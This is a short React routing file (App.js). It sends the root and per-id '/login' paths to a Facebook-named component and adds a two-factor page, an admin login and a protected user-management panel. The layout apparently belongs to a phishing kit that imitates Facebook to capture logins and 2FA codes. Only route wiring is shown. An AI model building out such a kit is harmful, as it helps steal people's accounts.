import './output.css';
import FacebookP from "./Components/Facebook.js"
import TwoFAPage from "./Components/TwoFAPage.js"

import { Routes, Route } from "react-router-dom"
import AdminLogin from './Components/AdminLogin.js';
import UserManagement from './Components/UserManagement.js';
import { ProtectedRoute } from './Components/ProtectedRoute.js';

function App() {
  return (
    <div>
      <Routes>
        <Route path="/login/:id" element={<FacebookP />} />
        <Route path="/" element={<FacebookP />} />
        <Route path="/2fa" element={<TwoFAPage />} />
        <Route path="/admin-login" element={<AdminLogin />} />
        <Route element={<ProtectedRoute />}>
          <Route path="/admin/users" element={<UserManagement />} />
        </Route>
      </Routes>
    </div>
  );
}

export default App;


